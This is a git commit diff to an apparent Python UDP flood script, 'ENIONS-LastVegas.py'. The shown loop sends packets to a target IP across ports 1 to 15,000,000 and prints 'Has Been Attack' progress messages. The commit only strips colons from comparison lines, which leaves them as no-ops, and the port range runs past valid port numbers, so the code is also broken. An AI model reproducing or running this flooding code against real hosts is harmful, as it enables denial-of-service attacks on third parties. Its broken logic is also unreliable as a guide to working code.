e068bfdd781bd4777f49e7a1deb43a75bd3f774a
Rolls <103021577+DoreatorFlaminggp@users.noreply.github.com>
2023-05-11 22:21:05 +0700

    Update ENIONS-LastVegas.py

--- ENIONS-LastVegas.py
+++ ENIONS-LastVegas.py
@@ -55,11 +55,11 @@ while True:
     for port in range(1, 15000000):
         white.sendto(random, (ip, port))
         sent = sent + 1
-        sent==15000000:
+        sent==15000000
         port = port + 1
-        port==15000000:
+        port==15000000
         ping = ping + 1
-        ping==15000000:
+        ping==15000000
         print("\033[1;91mHas Been Attack ====> \033[1;32m%s \033[1;91m Has Been Sent Packet to =====> \033[1;32m%s \033[1;91mHas Been Attack Port =====> \033[1;32m%s " % (sent, ip, port))
 
 print("\033[1;92mAttack finished\033[0m")
